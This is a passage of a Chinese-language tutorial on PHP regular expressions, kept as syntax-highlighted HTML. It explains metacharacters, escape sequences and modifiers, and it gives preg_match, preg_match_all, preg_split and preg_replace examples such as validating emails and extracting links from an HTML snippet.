operator">></span> 重新使用的模式单元，如：\<span class="token package"><span class="token punctuation">\</span>1</span>        <span class="token operator">></span> 普通转义字符，如：\<span class="token package">d</span>， \<span class="token package">D</span>， \<span class="token package">w</span>        <span class="token operator">></span> 转义元字符，如：\<span class="token operator">*</span>，\<span class="token punctuation">.</span>        <span class="token operator">></span> 元字符<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-元字符（具有特殊意义字符）："><a href="#2-元字符（具有特殊意义字符）：" class="headerlink" title="2.元字符（具有特殊意义字符）："></a>2.元字符（具有特殊意义字符）：</h3><pre><code>        [] 表示单个字符的原子表            例如：[aoeiu] 表示任意一个元音字母                  [0-9] 表示任意一位数字                  [a-z][0-9]表示小写字和一位数字构成的两位字符                  [a-zA-Z0-9] 表示任意一位大小字母或数字        [^] 表示除中括号内原子之外的任何字符 是[]的取反            例如：[^0-9] 表示任意一位非数字字符                  [^a-z] 表示任意一位非小写字母        {m}    表示对前面原子的数量控制，表示是m次            例如：[0-9]{4} 表示4为数字                  [1][3-8][0-9]{9} 手机号码        {m,} 表示对前面原子的数量控制，表示是至少m次            例如： [0-9]{2,} 表示两位及以上的数字        {m,n}表示对前面原子的数量控制，表示是m到n次            例如： [a-z]{6,8} 表示6到8位的小写字母        * 表示对前面原子的数量控制，表示是任意次，等价于{0,}        + 表示对前面原子的数量控制，表示至少1次，等价于{1,}        ? 表示对前面原子的数量控制，表示0次或1次（可有可无） 等价于{0,1}            例如：正整数：[1-9][0-9]*                    整数：[\-]?[0-9]+                    email：见下面详解        () 表示一个整体原子，【还有一个子存储单元的作用】。                也可以使用?:来拒绝子存储。 （?:.*?）            例如：（red） 字串red                   (rea|blue) 字串red或blue                   (abc){2} 表示两个abc        |  表示或的意思                (rea|blue) 字串red或blue        ^  用在正则单元块的开头处，表示必须以指定的开头        $  用在正则单元块的结尾处，表示必须以指定的结尾        .  表示任意一个除换行符之外的字符                常用组合： .*?  表示*最小匹配所有字符（拒绝贪婪匹配）</code></pre><h4 id="email："><a href="#email：" class="headerlink" title="email："></a>email：</h4><p><a href="https://bbs.csdn.net/topics/220012055" target="_blank" rel="noopener">preg_match(“/([\w-]+\@[\w-]+.[\w-]+)/“,$email)</a>的理解</p><h5 id="1-关于-："><a href="#1-关于-：" class="headerlink" title="1.关于\："></a>1.关于\：</h5><pre><code> \ 将下一个字符标记为一个特殊字符、或一个原义字符、或一个 向后引用、或一个八进制转义符。例如，&#39;n&#39; 匹配字符 &quot;n&quot;。&#39;\n&#39; 匹配一个换行符。序列 &#39;\\&#39; 匹配 &quot;\&quot; 而 &quot;\(&quot; 则匹配 &quot;(&quot;。 </code></pre><h5 id="2-关于-w："><a href="#2-关于-w：" class="headerlink" title="2.关于\w："></a>2.关于\w：</h5><pre><code> \w 匹配包括下划线的任何单词字符。等价于&#39;[A-Za-z0-9_]&#39;。  \w-是匹配上述的外加减 </code></pre><h5 id="3-构造正则表达式："><a href="#3-构造正则表达式：" class="headerlink" title="3.构造正则表达式："></a>3.构造正则表达式：</h5><p> 可以通过在一对分隔符之间放入表达式模式的各种组件来构造一个正则表达式，即/expression/ </p><p>而这里是</p><pre><code>/([\w\-]+\@[\w\-]+\.[\w\-]+)/</code></pre><h3 id="3-普通转义字符"><a href="#3-普通转义字符" class="headerlink" title="3.普通转义字符:"></a>3.普通转义字符:</h3><table><thead><tr><th align="left">\d</th><th>匹配一个数字；等价于[0-9]</th></tr></thead><tbody><tr><td align="left">\D</td><td>匹配除数字以外任何一个字符；等价于<code>[^0-9]</code></td></tr><tr><td align="left">\w</td><td>匹配一个英文字母、数字或下划线；等价于[0-9a-zA-Z_]</td></tr><tr><td align="left">\W</td><td>匹配除英文字母、数字和下划线以外任何一个字符；等价于<code>[^0-9a-zA-Z_]</code></td></tr><tr><td align="left">\s</td><td>匹配一个空白字符；等价于[\f\n\r\t\v]</td></tr><tr><td align="left">\S</td><td>匹配除空白字符以外任何一个字符；等价于<code>[^\f\n\r\t\v]</code></td></tr><tr><td align="left">\f</td><td>匹配一个换页符等价于 \x0c 或 \cL</td></tr><tr><td align="left">\n</td><td>匹配一个换行符；等价于 \x0a 或 \cJ</td></tr><tr><td align="left">\r</td><td>匹配一个回车符等价于\x0d 或 \cM</td></tr><tr><td align="left">\t</td><td>匹配一个制表符；等价于 \x09\或\cl</td></tr><tr><td align="left">\v</td><td>匹配一个垂直制表符；等价于\x0b或\ck</td></tr><tr><td align="left">\oNN</td><td>匹配一个八进制数字</td></tr><tr><td align="left">\xNN</td><td>匹配一个十六进制数字</td></tr><tr><td align="left">\cC</td><td>匹配一个控制字符</td></tr></tbody></table><h3 id="4-正则表达式中模式修正符作用详解-i、g、m、s、x、e"><a href="#4-正则表达式中模式修正符作用详解-i、g、m、s、x、e" class="headerlink" title="4. 正则表达式中模式修正符作用详解(i、g、m、s、x、e)"></a>4. <a href="https://blog.csdn.net/forest_fire/article/details/50944901" target="_blank" rel="noopener">正则表达式中模式修正符作用详解(i、g、m、s、x、e)</a></h3><p>模式修正符    说明<br>i    表示在和模式进行匹配进不区分大小写<br>m    将模式视为多行，使用^和$表示任何一行都可以以正则表达式开始或结束<br>s    如果没有使用这个模式修正符号，元字符中的”.”默认不能表示换行符号,将字符串视为单行<br>x    表示模式中的空白忽略不计<br>e    正则表达式必须使用在preg_replace替换字符串的函数中时才可以使用(讲这个函数时再说)<br>A    以模式字符串开头，相当于元字符^<br>Z    以模式字符串结尾，相当于元字符$<br>U    正则表达式的特点：就是比较“贪婪”，使用该模式修正符可以取消贪婪模式</p><h2 id="四、-正则表达式的函数："><a href="#四、-正则表达式的函数：" class="headerlink" title="四、 正则表达式的函数："></a>四、 正则表达式的函数：</h2><table><thead><tr><th align="left">函数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_filter.html" target="_blank" rel="noopener">preg_filter</a></td><td align="left">执行一个正则表达式搜索和替换</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_grep.html" target="_blank" rel="noopener">preg_grep</a></td><td align="left">返回匹配模式的数组条目</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_last_error.html" target="_blank" rel="noopener">preg_last_error</a></td><td align="left">返回最后一个PCRE正则执行产生的错误代码</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_match_all.html" target="_blank" rel="noopener">preg_match_all</a></td><td align="left">执行一个全局正则表达式匹配</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_match.html" target="_blank" rel="noopener">preg_match</a></td><td align="left">执行一个正则表达式匹配</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_quote.html" target="_blank" rel="noopener">preg_quote</a></td><td align="left">转义正则表达式字符</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace_callback_array.html" target="_blank" rel="noopener">preg_replace_callback_array</a></td><td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace_callback.html" target="_blank" rel="noopener">preg_replace_callback</a></td><td align="left">执行一个正则表达式搜索并且使用一个回调进行替换</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_replace.html" target="_blank" rel="noopener">preg_replace</a></td><td align="left">执行一个正则表达式的搜索和替换</td></tr><tr><td align="left"><a href="https://www.runoob.com/php/php-preg_split.html" target="_blank" rel="noopener">preg_split</a></td><td align="left">通过一个正则表达式分隔字符串</td></tr></tbody></table><h3 id="实例："><a href="#实例：" class="headerlink" title="实例："></a>实例：</h3><h4 id="1-正则表达式匹配"><a href="#1-正则表达式匹配" class="headerlink" title="1.正则表达式匹配"></a>1.正则表达式匹配</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正则匹配函数preg_match()</span><span class="token comment" spellcheck="true">//模糊匹配（包含形式）</span><span class="token comment" spellcheck="true">//if(preg_match("/a/","qwertayuio")){ //匹配字串中是否包含a字符</span><span class="token comment" spellcheck="true">//if(preg_match("/(abc)/","qwerta bcayuio")){ //匹配字串中是否包含abc字串</span><span class="token comment" spellcheck="true">//if(preg_match("/[abc]/","qwertbycuiop")){ //匹配字串中是否包含a、b或c字字符</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]/","qwertbycuiop")){ //匹配字串中是否包数字</span><span class="token comment" spellcheck="true">//if(preg_match("/[a-z]/","12345a6789")){ //匹配字串中是否包小写字母</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]{2}/","qwe89rqw9re8qwer",$a)){ //匹配字串中是否包两位的数字</span><span class="token comment" spellcheck="true">//if(preg_match("/[0-9]{2,}/","qwe12rqw9re8qwer",$a)){ //匹配字串中是否包至少两位的数字</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/[0-9]{2,4}/"</span><span class="token punctuation">,</span><span class="token string">"qwe12567rqw9re8qwer"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//匹配字串中是否包至少两位到4位的数字</span> <span class="token keyword">echo</span> <span class="token string">"匹配！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"不匹配！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//精确匹配</span><span class="token comment" spellcheck="true">//if(preg_match("/^[0-9]{2}$/","34")){ //精确匹配两位数字</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[1][35][0-9]{9}$/"</span><span class="token punctuation">,</span><span class="token string">"13520319616"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//匹配一个手机号码</span> <span class="token keyword">echo</span> <span class="token string">"匹配！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"不匹配！"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-正则的元字符匹配"><a href="#2-正则的元字符匹配" class="headerlink" title="2.正则的元字符匹配"></a>2.正则的元字符匹配</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正则的元字符使用</span><span class="token comment" spellcheck="true">//检测是否是一个合法的mail地址</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[\w\.]+@[\w]+(\.[a-zA-Z]+){1,3}$/"</span><span class="token punctuation">,</span><span class="token string">"asd@asd.com"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"正确"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"错误"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//检测是否是一个十六进制整数（正整数，负整数，0）</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^-?0[xX][\da-fA-F]+$/"</span><span class="token punctuation">,</span><span class="token string">"-2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"正确"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"错误"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//检测是否是一个整数（正整数，负整数，0）</span><span class="token comment" spellcheck="true">//if(preg_match("/^-?[0-9]+$/","-2")){</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^-?\d+$/"</span><span class="token punctuation">,</span><span class="token string">"-2"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"正确"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"错误"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//检测一个变量名是否正确</span><span class="token comment" spellcheck="true">//if(preg_match("/^[a-zA-Z_][a-zA-Z0-9_]*$/","1a5b_c")){</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/^[a-zA-Z_][\w]*$/"</span><span class="token punctuation">,</span><span class="token string">"a5b_c"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"正确"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"错误"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//匹配字串中的4位数字</span><span class="token comment" spellcheck="true">//preg_match("/[0-9]{4}/","qweabi123srqcdwer456iabs7890asfcd",$a);</span><span class="token comment" spellcheck="true">//preg_match("/\d{4}/","qweabi123srqcdwer456iabs7890asfcd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a[0]); //匹配:7890</span><span class="token comment" spellcheck="true">//preg_match_all("/(ab|cd)/","qweabisrqcdweriabsasfcd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a[0]); //匹配字串所有ab或cd</span><span class="token comment" spellcheck="true">//preg_match_all("/is/","qweisrqwerisasfd",$a);</span><span class="token comment" spellcheck="true">//var_dump($a); //匹配字串所有is</span><span class="token comment" spellcheck="true">//preg_match("/.*/","*a\nbc",$a);</span><span class="token comment" spellcheck="true">//var_dump($a); //*a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-正则表达式匹配网页"><a href="#3-正则表达式匹配网页" class="headerlink" title="3.正则表达式匹配网页"></a>3.正则表达式匹配网页</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正则匹配函数：preg_match preg_match_all</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span>yfstr <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mainNav<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>clearfix<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>首页<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>3<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span><span class="token constant">GSM</span>手机<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>4<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>双模手机<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>category.php?id<span class="token punctuation">=</span>6<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>手机配件<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>group_buy.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>团购  商品<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>activity.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>优惠活动<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>snatch.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>夺宝奇兵<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>auction.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>拍卖活动<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>exchange.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>积分商城<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>message.php<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span>留言板<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://bbs.ecshop.com/<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>external nofollow<span class="token punctuation">"</span></span> <span class="token punctuation">></span></span></span><span class="token constant">EC</span>论坛<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>yfstr<span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;table width='900' border='1'>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;tr>&lt;th>名称&lt;/th>&lt;th>URL地址&lt;/th>&lt;th>链接&lt;/th>&lt;/tr>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//使用正则匹配</span><span class="token function">preg_match_all</span><span class="token punctuation">(</span><span class="token string">"/&lt;a href=\"(.*?)\".*?>(.*?)&lt;\/a>/s"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$v</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"&lt;tr>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$a[2][$k]}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$a[1][$k]}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;td>{$v}&lt;/td>"</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token string">"&lt;/tr>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">echo</span> <span class="token string">"&lt;/table>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注:使用<code>&lt;&lt;&lt;</code> 这个是php定界符</p><p>使用格式:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token constant">EOF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用定界符无需给双引号增加转义字符,可以参考如下:</p><pre class="line-numbers language-php"><code class="language-php"><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"/&lt;div id=\"mainNav\" class=\"clearfix\">/"</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token operator">&lt;</span><span class="token constant">EOF</span><span class="token variable">$str</span><span class="token operator">=</span><span class="token string">"/&lt;div id="</span>mainNav<span class="token string">" class="</span>clearfix<span class="token string">">/"</span><span class="token punctuation">;</span><span class="token constant">EOF</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4正则的其他函数使用"><a href="#4正则的其他函数使用" class="headerlink" title="4正则的其他函数使用"></a>4正则的其他函数使用</h4><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//正则的其他函数使用：</span><span class="token comment" spellcheck="true">//preg_quote -- 转义正则表达式字符，正则表达式特殊字符有： . \ + * ? [ ^ ] $ ( ) { } = ! </span><span class="token markup">&lt; ></span> <span class="token operator">|</span> <span class="token punctuation">:</span> <span class="token operator">-</span><span class="token comment" spellcheck="true">//preg_split -- 用正则表达式分割字符串</span><span class="token comment" spellcheck="true">//preg_replace -- 执行正则表达式的搜索和替换</span><span class="token comment" spellcheck="true">//1.preg_quote -- 转义正则表达式字符</span><span class="token keyword">echo</span> <span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token string">"(abc){10}"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//在每个增则表达式语法的字符前增加一个反斜杠</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"a{4}"</span><span class="token punctuation">;</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token function">preg_quote</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">,</span><span class="token string">"werta{4}yu"</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//只有被转义了以后才可以被匹配到</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;br/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//2. preg_split -- 用正则表达式分割字符串</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"12,34:56;784;35,67:897:65"</span><span class="token punctuation">;</span><span class="token variable">$list</span> <span class="token operator">=</span> <span class="token function">preg_split</span><span class="token punctuation">(</span><span class="token string">"/[,:;]/"</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$list</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;hr/>"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//3. preg_replace执行正则表达式的搜索和替换</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string">"12,34:56;784;35,67:897:65"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//要求将上面的:,;都换成空格</span><span class="token keyword">echo</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[,;:]/"</span><span class="token punctuation">,</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">='</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span>red</span><span class="token punctuation">'</span></span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>aaaaa<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>bbbbb<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>ddddd<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span></span>eeeee<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将上面字串中所有li标签中都添加一个b标签。</span><span class="token keyword">echo</span> <span class="token 